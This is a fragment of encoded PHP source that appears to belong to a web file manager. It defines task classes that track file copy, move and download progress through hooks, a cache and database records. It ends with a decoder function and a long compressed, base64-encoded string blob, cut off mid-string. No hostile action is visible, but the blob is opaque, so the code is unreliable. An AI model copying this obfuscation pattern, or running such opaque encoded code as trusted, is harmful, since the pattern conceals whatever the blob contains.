($×»åÒÊ² == self::STATYS_STOP) { $ãöŒ = 2; $ÜÚßÇ²[$ëÁÉ­ß°[1670]] += $ãöŒ; self::valueSet($ºŞƒÚ€[$ëÁÉ­ß°[399]], $ÜÚßÇ²); sleep($ãöŒ); $this->update(); return; } } $ºŞƒÚ€[$ëÁÉ­ß°[746]] = $×»åÒÊ² ? $×»åÒÊ² : $ºŞƒÚ€[$ëÁÉ­ß°[746]]; $ºŞƒÚ€[$ëÁÉ­ß°[1670]] = $ÜÚßÇ²[$ëÁÉ­ß°[1670]] ? $ÜÚßÇ²[$ëÁÉ­ß°[1670]] : 0; $ºŞƒÚ€[$ëÁÉ­ß°[1669]] = timeFloat(); Hook::trigger($ëÁÉ­ß°[1684], $ºŞƒÚ€); self::valueSet($ºŞƒÚ€[$ëÁÉ­ß°[399]], $ºŞƒÚ€); } public function onKillSet($àêİ İÅ, $†ø‰ì­³ = array()) { $this->onKillCall = array($àêİ İÅ, $†ø‰ì­³); } public function onKill() { $Å­áÍó‹ =& $_SERVER[­á Ş³Ö]; self::log($Å­áÍó‹[1677] . $this->task[$Å­áÍó‹[399]] . $Å­áÍó‹[1685]); Hook::trigger($Å­áÍó‹[1686], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Õ®éôÌ) { $¯¶¾ÚùÎ =& $_SERVER[­á Ş³Ö]; Cache::set($¯¶¾ÚùÎ[1683] . $this->task[$¯¶¾ÚùÎ[399]], $Õ®éôÌ, 60); return $Õ®éôÌ; } public static function get($¬Ìîå) { $Ú·ßÆùÆ =& $_SERVER[­á Ş³Ö]; $Í¸Ì°é‘ = self::valueGet($¬Ìîå); if (is_array($Í¸Ì°é‘) && $Í¸Ì°é‘[$Ú·ßÆùÆ[1687]]) { $öê¸ˆ¿ = ActionApply($Í¸Ì°é‘[$Ú·ßÆùÆ[1687]], array($Í¸Ì°é‘)); $Í¸Ì°é‘ = is_array($öê¸ˆ¿) ? $öê¸ˆ¿ : $Í¸Ì°é‘; } return $Í¸Ì°é‘; } public static function listData() { $â«š­Ö‡ = self::valueGet(); return array_sort_by($â«š­Ö‡, $_SERVER[­á Ş³Ö][1667], !0); } public static function kill($Íô”´âö) { return self::changeStatus($Íô”´âö, self::STATYS_KILL); } public static function stop($µ’‹àæ) { return self::changeStatus($µ’‹àæ, self::STATYS_STOP); } public static function restart($ÃÁüñ°) { return self::changeStatus($ÃÁüñ°, self::STATYS_RUNNING); } public static function killAll() { $—ùı»Ù× =& $_SERVER[­á Ş³Ö]; $ÏƒÖ½»ø = self::listData(); foreach ($ÏƒÖ½»ø as $Ğ‹´×úã) { self::kill($Ğ‹´×úã[$—ùı»Ù×[399]]); } sleep(2); foreach ($ÏƒÖ½»ø as $Ğ‹´×úã) { self::valueSet($Ğ‹´×úã[$—ùı»Ù×[399]], !1); } } private static function changeStatus($š‰•©Şô, $ÅÓÈøş°) { $§´Ì¦ºÉ =& $_SERVER[­á Ş³Ö]; $©éª¢Ø = self::valueGet($š‰•©Şô); if (!$©éª¢Ø) { return !1; } $©éª¢Ø[$§´Ì¦ºÉ[746]] = $ÅÓÈøş°; self::valueSet($š‰•©Şô, $©éª¢Ø); self::log($§´Ì¦ºÉ[1688] . $©éª¢Ø[$§´Ì¦ºÉ[399]] . $§´Ì¦ºÉ[1689] . $ÅÓÈøş°); return !0; } public static function valueGet($ß×îÆ€à = false) { $¸‰“ñŞ‚ =& $_SERVER[­á Ş³Ö]; if ($ß×îÆ€à) { $ÑŒ±•Æë = Model($¸‰“ñŞ‚[447])->where(array($¸‰“ñŞ‚[94] => $ß×îÆ€à, $¸‰“ñŞ‚[33] => $¸‰“ñŞ‚[1067]))->find(); return $ÑŒ±•Æë ? json_decode($ÑŒ±•Æë[$¸‰“ñŞ‚[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($¾œ§ƒÎç = false) { $ÒÙ»úÆ =& $_SERVER[­á Ş³Ö]; $‚õÓÙğŒ = array($ÒÙ»úÆ[33] => $ÒÙ»úÆ[1067]); if ($¾œ§ƒÎç) { $‚õÓÙğŒ[$ÒÙ»úÆ[1663]] = $¾œ§ƒÎç; } $¶àì¬Î‚ = Model($ÒÙ»úÆ[447])->where($‚õÓÙğŒ)->select(); $¶àì¬Î‚ = $¶àì¬Î‚ ? $¶àì¬Î‚ : array(); foreach ($¶àì¬Î‚ as $Âî¯ÈÍ => $ÓîÏ£¾ü) { $¶àì¬Î‚[$Âî¯ÈÍ] = json_decode($ÓîÏ£¾ü[$ÒÙ»úÆ[374]], !0); } return $¶àì¬Î‚; } public static function valueSet($£Ù¨ïå¹, $×ÖÕ­ú£) { $øææó¿Û =& $_SERVER[­á Ş³Ö]; if (!$×ÖÕ­ú£) { return Model($øææó¿Û[447])->where(array($øææó¿Û[94] => $£Ù¨ïå¹, $øææó¿Û[33] => $øææó¿Û[1067]))->delete(); } $¨ÇóÈ¬ñ = json_encode($×ÖÕ­ú£); if (!$¨ÇóÈ¬ñ) { ob_start(); var_dump($×ÖÕ­ú£); $±Û˜ = ob_get_clean(); self::log($øææó¿Û[1690] . json_encode_force($±Û˜)); } if (!$£Ù¨ïå¹ || !$×ÖÕ­ú£[$øææó¿Û[399]]) { return !1; } $´ŠßÇ³ø = array($øææó¿Û[33] => $øææó¿Û[1067], $øææó¿Û[1663] => USER_ID, $øææó¿Û[94] => $£Ù¨ïå¹, $øææó¿Û[374] => $¨ÇóÈ¬ñ); $ÖÌ” = $øææó¿Û[1691]; CacheLock::lock($ÖÌ”); Model($øææó¿Û[447])->add($´ŠßÇ³ø, array(), !0); CacheLock::unlock($ÖÌ”); } public static function log($œåÂê¤Ì) { if (!GLOBAL_DEBUG) { return; } write_log($œåÂê¤Ì, $_SERVER[­á Ş³Ö][1692]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ÏÓÊ«äù =& $_SERVER[­á Ş³Ö]; $Àî€®ƒ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ÏÓÊ«äù[1693], array($this, $ÏÓÊ«äù[1694])); Hook::bind($ÏÓÊ«äù[1219], array($this, $ÏÓÊ«äù[1695])); Hook::bind($ÏÓÊ«äù[1696], array($this, $ÏÓÊ«äù[1697])); Hook::bind($ÏÓÊ«äù[596], array($this, $ÏÓÊ«äù[1698])); Hook::bind($ÏÓÊ«äù[597], array($this, $ÏÓÊ«äù[1699])); Hook::bind($ÏÓÊ«äù[602], array($this, $ÏÓÊ«äù[1700])); Hook::bind($ÏÓÊ«äù[603], array($this, $ÏÓÊ«äù[1701])); Hook::bind($ÏÓÊ«äù[599], array($this, $ÏÓÊ«äù[1702])); Hook::bind($ÏÓÊ«äù[600], array($this, $ÏÓÊ«äù[1703])); Hook::bind($ÏÓÊ«äù[565], array($this, $ÏÓÊ«äù[1704])); Hook::bind($ÏÓÊ«äù[562], array($this, $ÏÓÊ«äù[1704])); Hook::bind($ÏÓÊ«äù[567], array($this, $ÏÓÊ«äù[1704])); Hook::bind($ÏÓÊ«äù[569], array($this, $ÏÓÊ«äù[1704])); Hook::bind($ÏÓÊ«äù[571], array($this, $ÏÓÊ«äù[1704])); Hook::bind($ÏÓÊ«äù[1705], array($this, $ÏÓÊ«äù[1706])); Hook::bind($ÏÓÊ«äù[587], array($this, $ÏÓÊ«äù[1707])); $this->sourceModelCopyFlag = !1; Hook::bind($ÏÓÊ«äù[1708], array($this, $ÏÓÊ«äù[1709])); Hook::bind($ÏÓÊ«äù[1710], array($this, $ÏÓÊ«äù[1711])); Hook::bind($ÏÓÊ«äù[1712], array($this, $ÏÓÊ«äù[1713])); $Àî€®ƒ[$ÏÓÊ«äù[1714]] = LNG($ÏÓÊ«äù[1715]); $Àî€®ƒ[$ÏÓÊ«äù[1716]] = 0; $Àî€®ƒ[$ÏÓÊ«äù[1717]] = 0; $Àî€®ƒ[$ÏÓÊ«äù[1060]] = $ÏÓÊ«äù[12]; $Àî€®ƒ[$ÏÓÊ«äù[1718]] = $ÏÓÊ«äù[12]; $Àî€®ƒ[$ÏÓÊ«äù[1719]] = 0; $Àî€®ƒ[$ÏÓÊ«äù[1720]] = 0; $Àî€®ƒ[$ÏÓÊ«äù[1721]] = 0; if (!$Àî€®ƒ[$ÏÓÊ«äù[1561]]) { $Àî€®ƒ[$ÏÓÊ«äù[1561]] = LNG($ÏÓÊ«äù[1722]); } } protected function endAfter() { $Å­æèÜí =& $_SERVER[­á Ş³Ö]; Hook::unbind($Å­æèÜí[1693], array($this, $Å­æèÜí[1694])); Hook::unbind($Å­æèÜí[1219], array($this, $Å­æèÜí[1695])); Hook::unbind($Å­æèÜí[1696], array($this, $Å­æèÜí[1697])); Hook::unbind($Å­æèÜí[596], array($this, $Å­æèÜí[1698])); Hook::unbind($Å­æèÜí[597], array($this, $Å­æèÜí[1699])); Hook::unbind($Å­æèÜí[602], array($this, $Å­æèÜí[1700])); Hook::unbind($Å­æèÜí[603], array($this, $Å­æèÜí[1701])); Hook::unbind($Å­æèÜí[599], array($this, $Å­æèÜí[1702])); Hook::unbind($Å­æèÜí[600], array($this, $Å­æèÜí[1703])); Hook::unbind($Å­æèÜí[565], array($this, $Å­æèÜí[1704])); Hook::unbind($Å­æèÜí[562], array($this, $Å­æèÜí[1704])); Hook::unbind($Å­æèÜí[567], array($this, $Å­æèÜí[1704])); Hook::unbind($Å­æèÜí[569], array($this, $Å­æèÜí[1704])); Hook::unbind($Å­æèÜí[571], array($this, $Å­æèÜí[1704])); Hook::unbind($Å­æèÜí[1705], array($this, $Å­æèÜí[1706])); Hook::unbind($Å­æèÜí[587], array($this, $Å­æèÜí[1707])); Hook::unbind($Å­æèÜí[1708], array($this, $Å­æèÜí[1709])); Hook::unbind($Å­æèÜí[1710], array($this, $Å­æèÜí[1711])); Hook::unbind($Å­æèÜí[1712], array($this, $Å­æèÜí[1713])); } public function copyMoveStart($Ğê€Ìë¡, $Î„Ò„†Å, $ÛÏù¯‡¯, $Ğ·¥ÖÇâ) { $’–Ÿµ =& $_SERVER[­á Ş³Ö]; self::log($’–Ÿµ[1723] . $Î„Ò„†Å . $’–Ÿµ[70] . $Ğ·¥ÖÇâ); $úÌ’ï¾ = rtrim(TEMP_FILES, $’–Ÿµ[8]); if (substr($Î„Ò„†Å, 0, strlen($úÌ’ï¾)) == $úÌ’ï¾) { return; } if (substr($Ğ·¥ÖÇâ, 0, strlen($úÌ’ï¾)) == $úÌ’ï¾) { return; } $íßá—¯é =& $this->task; $íßá—¯é[$’–Ÿµ[1724]] = KodIO::transferType($Ğê€Ìë¡, $ÛÏù¯‡¯); $this->update(); } public function updateAfter() { $®°‘åÔ¨ =& $_SERVER[­á Ş³Ö]; $¾ò€çÙ¨ =& $this->task; if (!$¾ò€çÙ¨[$®°‘åÔ¨[760]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¾ò€çÙ¨[$®°‘åÔ¨[1724]] == $®°‘åÔ¨[1308]) { return; } self::updateTask($¾ò€çÙ¨); } private static function updateTask(&$¼¤ÙÅ¬è) { $Ù‡Ïú” =& $_SERVER[­á Ş³Ö]; if ($¼¤ÙÅ¬è[$Ù‡Ïú”[1724]] == $Ù‡Ïú”[1190] || $¼¤ÙÅ¬è[$Ù‡Ïú”[1724]] == $Ù‡Ïú”[107]) { if ($¼¤ÙÅ¬è[$Ù‡Ïú”[1718]]) { $¼¤ÙÅ¬è[$Ù‡Ïú”[1721]] = $¼¤ÙÅ¬è[$Ù‡Ïú”[1720]] + $¼¤ÙÅ¬è[$Ù‡Ïú”[1717]]; } } else { if ($¼¤ÙÅ¬è[$Ù‡Ïú”[1724]] == $Ù‡Ïú”[1309]) { if ($¼¤ÙÅ¬è[$Ù‡Ïú”[1718]] == $Ù‡Ïú”[1190]) { $¼¤ÙÅ¬è[$Ù‡Ïú”[1721]] = $¼¤ÙÅ¬è[$Ù‡Ïú”[1720]] + $¼¤ÙÅ¬è[$Ù‡Ïú”[1717]] * 0.5; } else { if ($¼¤ÙÅ¬è[$Ù‡Ïú”[1718]] == $Ù‡Ïú”[107]) { $¼¤ÙÅ¬è[$Ù‡Ïú”[1721]] = $¼¤ÙÅ¬è[$Ù‡Ïú”[1720]] + $¼¤ÙÅ¬è[$Ù‡Ïú”[1716]] * 0.5 + $¼¤ÙÅ¬è[$Ù‡Ïú”[1717]] * 0.5; } } } } $¼¤ÙÅ¬è[$Ù‡Ïú”[1665]] = $¼¤ÙÅ¬è[$Ù‡Ïú”[1721]] / $¼¤ÙÅ¬è[$Ù‡Ïú”[760]]; if ($¼¤ÙÅ¬è[$Ù‡Ïú”[1665]] > 0) { $İÛ½âƒ = timeFloat() - $¼¤ÙÅ¬è[$Ù‡Ïú”[1667]] - $¼¤ÙÅ¬è[$Ù‡Ïú”[1670]]; $¼¤ÙÅ¬è[$Ù‡Ïú”[1671]] = $İÛ½âƒ * (1 - $¼¤ÙÅ¬è[$Ù‡Ïú”[1665]]) / $¼¤ÙÅ¬è[$Ù‡Ïú”[1665]]; } } public function addPath($÷£ÑÏßÂ) { $ä¾¿ÏË =& $_SERVER[­á Ş³Ö]; if (!$÷£ÑÏßÂ) { return; } $—ÉÛ½ =& $this->task; $ë¬Â”  = IO::infoWithChildren($÷£ÑÏßÂ); $ä¥åæÌ = $—ÉÛ½[$ä¾¿ÏË[1725]] ? $—ÉÛ½[$ä¾¿ÏË[1725]][$ä¾¿ÏË[1726]] : 0; $—ÉÛ½[$ä¾¿ÏË[1725]] = array($ä¾¿ÏË[1726] => $ä¥åæÌ + 1, $ä¾¿ÏË[420] => $ë¬Â” [$ä¾¿ÏË[32]], $ä¾¿ÏË[84] => $ë¬Â” [$ä¾¿ÏË[84]], $ä¾¿ÏË[509] => $ë¬Â” [$ä¾¿ÏË[509]] ? $ë¬Â” [$ä¾¿ÏË[509]] : $ë¬Â” [$ä¾¿ÏË[84]]); if ($ë¬Â” [$ä¾¿ÏË[33]] == $ä¾¿ÏË[200]) { $—ÉÛ½[$ä¾¿ÏË[783]] += 1; } else { $—ÉÛ½[$ä¾¿ÏË[783]] += $ë¬Â” [$ä¾¿ÏË[79]][$ä¾¿ÏË[77]]; if ($ë¬Â” [$ä¾¿ÏË[402]]) { $—ÉÛ½[$ä¾¿ÏË[783]] += $ë¬Â” [$ä¾¿ÏË[79]][$ä¾¿ÏË[78]] + 1; } } $—ÉÛ½[$ä¾¿ÏË[760]] += $ë¬Â” [$ä¾¿ÏË[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Ù÷³ö…¯) { } public function sourceAddHashEnd($é’ø’êÂ) { } public function sourceAddFileStart($¥™ï¡²È) { $¦¯ØÈ³ =& $_SERVER[­á Ş³Ö]; $²£ÑÀè± =& $this->task; $²£ÑÀè±[$¦¯ØÈ³[1716]] = $¥™ï¡²È[$¦¯ØÈ³[76]]; $²£ÑÀè±[$¦¯ØÈ³[1714]] = $¥™ï¡²È[$¦¯ØÈ³[32]]; $²£ÑÀè±[$¦¯ØÈ³[1060]] = $¥™ï¡²È[$¦¯ØÈ³[32]]; $²£ÑÀè±[$¦¯ØÈ³[1727]] = $¥™ï¡²È[$¦¯ØÈ³[84]]; $this->update(); } public function sourceAddFileEnd($øåœÔıŠ) { $á•ÕßÏ =& $_SERVER[­á Ş³Ö]; $±Â¦¥Ğ =& $this->task; $±Â¦¥Ğ[$á•ÕßÏ[1721]] += $øåœÔıŠ[$á•ÕßÏ[76]]; $±Â¦¥Ğ[$á•ÕßÏ[1727]] = $øåœÔıŠ[$á•ÕßÏ[84]]; $this->update(1); } public function copyFileStart($¨ğïØÑ, $Ï“à€ÎÕ, $ã¿üÂ¶, $÷‹óİŒ, $¦ÏÂ½á, $¢¡ë¿è†) { $¯·ˆÀÕè =& $_SERVER[­á Ş³Ö]; $»­„È£™ = $¦ÏÂ½á; if ($»­„È£™ == $GLOBALS[$¯·ˆÀÕè[1728]]) { $»­„È£™ = $GLOBALS[$¯·ˆÀÕè[1729]]; } $GLOBALS[$¯·ˆÀÕè[1729]] = $¦ÏÂ½á; $GLOBALS[$¯·ˆÀÕè[1728]] = $¢¡ë¿è†; $õôƒ‹Ô =& $this->task; $õôƒ‹Ô[$¯·ˆÀÕè[1714]] = $»­„È£™; $õôƒ‹Ô[$¯·ˆÀÕè[1716]] = (int) $¨ğïØÑ->size($Ï“à€ÎÕ); $õôƒ‹Ô[$¯·ˆÀÕè[1717]] = 0; $õôƒ‹Ô[$¯·ˆÀÕè[1060]] = $¯·ˆÀÕè[12]; $õôƒ‹Ô[$¯·ˆÀÕè[1718]] = $¯·ˆÀÕè[12]; $õôƒ‹Ô[$¯·ˆÀÕè[1719]] = 0; $¶ˆŸÁÈı = $õôƒ‹Ô[$¯·ˆÀÕè[1716]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($õôƒ‹Ô[$¯·ˆÀÕè[399]] . $¯·ˆÀÕè[1730]); if ($¶ˆŸÁÈı && file_exists(get_path_father($÷‹óİŒ))) { Cache::set($õôƒ‹Ô[$¯·ˆÀÕè[399]] . $¯·ˆÀÕè[1730], $÷‹óİŒ); $õôƒ‹Ô[$¯·ˆÀÕè[1687]] = array($¯·ˆÀÕè[1731], $¯·ˆÀÕè[1732]); } $this->update(0, $¶ˆŸÁÈı); } public static function updateCopyLocalFileSize($öåìå’) { $Ñ¿Ê½­ =& $_SERVER[­á Ş³Ö]; $Ò¶øÊ¦Š = Cache::get($öåìå’[$Ñ¿Ê½­[399]] . $Ñ¿Ê½­[1730]); if (!$Ò¶øÊ¦Š || !file_exists($Ò¶øÊ¦Š)) { return $öåìå’; } $öåìå’[$Ñ¿Ê½­[1717]] = @filesize($Ò¶øÊ¦Š); $öåìå’[$Ñ¿Ê½­[1721]] += $öåìå’[$Ñ¿Ê½­[1717]]; self::updateTask($öåìå’); return $öåìå’; } public function copyFileEnd($Õ³Ïìğ, $ğ€ĞîïÁ, $Ôæ†£¸, $ğ¼ŒêÑ¯, $İ„ëäØ , $™ò–âÁÈ) { $§³•Ø²² =& $_SERVER[­á Ş³Ö]; $±«Ëı =& $this->task; $±«Ëı[$§³•Ø²²[1717]] = $±«Ëı[$§³•Ø²²[1716]]; $±«Ëı[$§³•Ø²²[1718]] = $§³•Ø²²[12]; unset($±«Ëı[$§³•Ø²²[1687]]); if ($İ„ëäØ  == $±«Ëı[$§³•Ø²²[1714]]) { $±«Ëı[$§³•Ø²²[1720]] += $±«Ëı[$§³•Ø²²[1716]]; $±«Ëı[$§³•Ø²²[1721]] = $±«Ëı[$§³•Ø²²[1720]]; $…àº®ß° = 1; if (isset($±«Ëı[$§³•Ø²²[1727]]) && $±«Ëı[$§³•Ø²²[1727]] == $ğ€ĞîïÁ) { $…àº®ß° = 0; } $this->update($…àº®ß°); } else { $this->update(); $±«Ëı[$§³•Ø²²[1717]] = 0; } Cache::remove($±«Ëı[$§³•Ø²²[399]] . $§³•Ø²²[1730]); self::log($§³•Ø²²[1733] . $ğ€ĞîïÁ . $§³•Ø²²[70] . $ğ¼ŒêÑ¯ . $§³•Ø²²[231] . $İ„ëäØ  . $§³•Ø²²[1734] . $±«Ëı[$§³•Ø²²[1714]]); } public function updateFileEnd($Æşîà¡ğ, $ñºƒ°Äï) { $õñ´’“ú =& $_SERVER[­á Ş³Ö]; $Æ¯Áë·¿ =& $this->task; $Æ¯Áë·¿[$õñ´’“ú[1714]] = $Æşîà¡ğ; $Æ¯Áë·¿[$õñ´’“ú[1716]] = $ñºƒ°Äï; $Æ¯Áë·¿[$õñ´’“ú[1720]] += $ñºƒ°Äï; $Æ¯Áë·¿[$õñ´’“ú[1721]] = $Æ¯Áë·¿[$õñ´’“ú[1720]]; $this->update(1); self::log($õñ´’“ú[1735] . $Æşîà¡ğ); } public function sourceModelCopy($íÙó·¾™) { $™¹ù˜î =& $_SERVER[­á Ş³Ö]; $ØŞ¦²‰È = $íÙó·¾™[0]; $˜åÍ²ÔÚ = $íÙó·¾™[1]; $İ›ƒëíõ =& $this->task; $this->sourceModelCopyFlag = !0; $ÊÒŞÅ‡İ = 0; switch ($ØŞ¦²‰È) { case $™¹ù˜î[563]: $ÊÒŞÅ‡İ = 1; break; case $™¹ù˜î[566]: $İ›ƒëíõ[$™¹ù˜î[1714]] = $˜åÍ²ÔÚ[$™¹ù˜î[32]]; break; case $™¹ù˜î[568]: $ÊÒŞÅ‡İ = intval($íÙó·¾™[$™¹ù˜î[380]] * 0.4); break; case $™¹ù˜î[570]: $ÊÒŞÅ‡İ = intval($íÙó·¾™[$™¹ù˜î[380]] * 0.2); break; case $™¹ù˜î[572]: $ÊÒŞÅ‡İ = intval($íÙó·¾™[$™¹ù˜î[380]] * 0.4); break; } $this->update($ÊÒŞÅ‡İ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($õøÕæ¸Û, $Ò©“ùæî) { $¤Ñ“ì´ =& $_SERVER[­á Ş³Ö]; $this->sourceModelCopyFlag = !0; $Šà´¶æ¹ = 1; if (isset($õøÕæ¸Û[$¤Ñ“ì´[79]])) { $Šà´¶æ¹ = $õøÕæ¸Û[$¤Ñ“ì´[79]][$¤Ñ“ì´[77]]; $Šà´¶æ¹ = $Šà´¶æ¹ + $õøÕæ¸Û[$¤Ñ“ì´[79]][$¤Ñ“ì´[78]] + 1; } $this->update($Šà´¶æ¹); $this->sourceModelCopyFlag = !1; } public function sourceMove($´ï Çó) { $this->sourceRemove($´ï Çó, !1); } public function curlProgress($µ‹Ô†µÃ, $ıóş›ï, $òñí–Å¯, $¼²¯úÆŸ, $Ğ¶»—¿ñ) { $êê¤ÏÓ =& $_SERVER[­á Ş³Ö]; $ŸËè²Ú´ =& $this->task; if ($Ğ¶»—¿ñ > 0) { $ŸËè²Ú´[$êê¤ÏÓ[1060]] = $êê¤ÏÓ[1736]; $ŸËè²Ú´[$êê¤ÏÓ[1718]] = $êê¤ÏÓ[107]; if ($ŸËè²Ú´[$êê¤ÏÓ[1716]]) { $ŸËè²Ú´[$êê¤ÏÓ[1717]] = $Ğ¶»—¿ñ; } if ($ŸËè²Ú´[$êê¤ÏÓ[1719]]) { $ŸËè²Ú´[$êê¤ÏÓ[1717]] = $Ğ¶»—¿ñ + $ŸËè²Ú´[$êê¤ÏÓ[1719]]; } } else { if ($òñí–Å¯ > 0) { if ($ŸËè²Ú´[$êê¤ÏÓ[1716]] == $ıóş›ï) { $ŸËè²Ú´[$êê¤ÏÓ[1717]] = $òñí–Å¯; $ŸËè²Ú´[$êê¤ÏÓ[1060]] = $êê¤ÏÓ[1737]; $ŸËè²Ú´[$êê¤ÏÓ[1718]] = $êê¤ÏÓ[1190]; } } } $this->update(); } public function curlProgressStart($•ö§·„½) { } public function curlProgressEnd($¬ªòº¡) { $¬††±ª =& $_SERVER[­á Ş³Ö]; $­Êºøı =& $this->task; $ „ĞŞÃõ = curl_getinfo($¬ªòº¡); $À¸‘öÇæ = $ „ĞŞÃõ[$¬††±ª[1738]]; if ($À¸‘öÇæ == -1) { $À¸‘öÇæ = $ „ĞŞÃõ[$¬††±ª[1739]]; } if ($­Êºøı[$¬††±ª[1718]] == $¬††±ª[107] && $À¸‘öÇæ) { $­Êºøı[$¬††±ª[1719]] += $À¸‘öÇæ; } $this->update(); } } goto bù˜éÕ­®­; Cœ†…³İÛ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\255\341\240\336\263\326", "\xec\x80\xca\xc2\xdc\xd1"); $_SERVER[­á Ş³Ö] = explode("\x7c\x4\x7c\x5\x7c\x1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x7\x78\x1c\xd5\xd5\x30\x4c\x4d\x80\x84\x40\x28\x9\x81\x24\xc\xa\xb6\x24\x7b\x8b\x25\x77\xd9\xb2\xbd\x92\x56\xd2\xe2\x95\x56\xec\xae\x5c\x90"."\304\170\166\167\44\215\264\273\263\232\231\125\263\15\4\142\14\66\235\100\200\70\164\102\11\230\336\261\41\4\170\51\301\1\22\102\13\241\270\322\2\44\324\204\300\167\313\271"."\x65\x66\x57\xf0\xfe\xcf\xff\x3d\xcf\xc7\x83\xb5\xb7\xcf\x2d\xe7\x9e\x7b\xce\xb9\xe7\x9c\xbb\xe1\xe1\x1b\x1e\xbf\xe7\xa5\x55\x7b\xad\xda\x7b\xd5\xee\x1f\x5e\x77\xc5\x9a\xd\x8f\xd1\x30\xfa\xbb"."\7\372\107\302\107\256\337\147\67\362\337\301\353\327\125\125\265\316\332\157\152\373\167\317\276\343\46\355\172\355\6\355\364\130\364\251\77\106\366\337\162\343\61\341\35\127\75\65"."\266\143\367\335\346\350\307\246\353\120\141\132\267\216\376\50\171\323\121\364\121\303\166\154\232\220\66\363\275\106\37\15\33\171\372\33\244\77\235\361\250\245\347\114\107\247\321\0".base64_decode('/VF5v9BfeyhrsHy1PZZUE50dHeF4EgrVyfk5MwOhgmZpOfh+Qbds1Bu5ObVgFvS8')."\x2b\x45\x24\x64\x34\x47\x4b\x69\x36\xb4\xd4\xd4\xa0\x36\x85\x3b\xa2\xb1\xe5\x6a\x72\x79\x47\x18\x4a\xa4\xd4\xa1\xa2\x6e\x8d\xd1\x18\x9\x26\x1c\xcd\x72\x92\x46\x4e\xe7\x25\x46\x2c\xde\xaf\x86".base64_decode('cEukXUnGQ+2JUGMyEmunyY2xtrZIsjQ9HotGG0KNi0tzOuKhlraQgvqX1VUj32tW')."\51\53\150\316\12\245\232\6\232\15\75\233\241\301\274\306\272\343\214\25\40\224\344\41\264\114\371\142\66\113\43\355\74\224\321\173\265\142\26\146\253\111\216\24\54\43\247\261".base64_decode('QS/Wx3gqDWhFxzTyaRoJjzqWJtJRX9NoofU8NJUIR8ONSQV3UGmOx9oUWIScZju6').base64_decode('pSxtDcfDCu50fSUZa6UC8NKOpkIJRaPKRC04eq7AmqF1yjQWizeF40rDckXMUNrM').base64_decode('5cx8ALWCVtKRuhqOx2nAB+AdjeBFg0isuTkR5jEY3LFR1JPpAJ+uWKY366jDWrbI')."\300\164\220\376\126\302\17\374\232\66\200\356\220\221\67\212\0\246\320\204\151\362\155\5\201\42\53\255\263\24\75\3\201\34\252\157\302\316\103\333\160\230\6\353\27\320\337\171"."\x50\x28\xa5\xe2\x3c\xdd\x72\x54\x3d\x9f\x36\x33\x46\x1e\x36\xeb\x42\x0\x3a\xcd\xe9\x6f\xb2\xc\x54\x80\xc6\x7b\xcd\x6c\x86\x85\x6d\x63\x1c\x86\xd2\x6b\x64\xf5\xf6\x62\x4e\x2e\xc2\xa3\xe9\x7e".base64_decode('I5ux2P76upI0GuXbFZcVsQLqCd/pRu+Y2G+4XAfPtc2ildYjaH/QeA0k646DBgdz')."\x63\x98\x9d\x85\xac\xa9\x65\x12\xba\xc5\x87\x66\x98\xcd\xa8\xa1\x58\xd1\x91\x13\x8b\xa4\x58\xb3\x69\xe5\x9a\x10\x66\x80\xef\xa3\x5d\x61\x74\x96\xc9\x18\x64\xfb\x22\x23\xcd\x58\xb0\xaa\xeb\xe7"."\xfe\x2f\x7b\xba\x16\xa1\x3f\xd5\x80\xfa\xba\xa1\x4f\xfd\x7a\x36\xab\xea\xa3\x3a\x6c\x9c\x5c\x66\xa6\xcd\x26\x23\x68\xa7\x8c\x7c\x10\xa5\xd0\x68\x24\xa6\xf6\x6b\x76\x7f\x5b\x66\xa6\x4a\x6a\x31".strrev(' ªfO$s0<óĞ§û†‘+-išÎ^Âtİ®§€]»‘¾jìş…GÑšŒ').base64_decode('61CoyadklDZludJaZ9TZrGIuy0NsdDzN5onOKFvOTC8NpNixUAEfNGyC4cT21AqF')."\254\221\326\34\303\314\7\315\264\243\73\176\333\261\164\15\132\14\245\323\272\155\373\33\315\274\143\231\131\177\50\233\65\107\374\61\313\350\63\362\165\312\24\100\266\50\23\155".strrev('Ú`»šÅd9gPS¨ÎÃåº½ÛËKiy¶ÿ^Ô¦gğp)æ+S°u€F?j')."\356\136\235\242\71\216\226\356\307\30\104\64\137\377\65\345\215\174\326\310\353\45\145\303\243\5\303\322\155\326\127\245\245\55\11\215\240\326\165\177\207\245\365\345\264\72\245\120"."\114\241\231\201\235\132\46\215\226\206\251\251\123\322\70\352\123\162\105\333\361\133\72\102\105\6\72\356\140\222\43\275\376\66\274\257\14\75\343\117\40\214\15\311\323\247\315\120"."\20\350\50\54\217\246\266\46\223\35\152\244\31\35\311\355\141\265\55\224\154\154\205\156\73\132\37\353\163\24\341\141\336\44\113\134\346\107\373\13\3\127\73\32\253\110\354\60".base64_decode('R3QLfbhhrE4ZNDMpczTAsnDhBEI0rDBe7oLjj2v5Pjw/qTFHBxC0h/vcEx3V831O').strrev('o,V¼oV5´õaÚ}MzãúÎ›…>Ê2PGaÃŠ\\œÖ"jã„—Ç˜«?')."\x18\x96\x17\x8d\xb4\xe0\x89\x69\xf2\xdb\xa8\x90\x5f\x2e\xc5\xda\x8e\x1a\x39\x3\xf7\xdd\xe1\x39\x64\x26\xd1\x49\xdf\x2\x1d\xa\x92\x1\xd5\x77\xdb\x53\xaa\xba\x33\x53\xab\xfd\xe8\xef\x94\xea"."\256\356\246\300\224\236\205\101\103\324\11\326\4\152\224\332\151\263\224\16\104\172\30\132\126\201\101\227\224\230\246\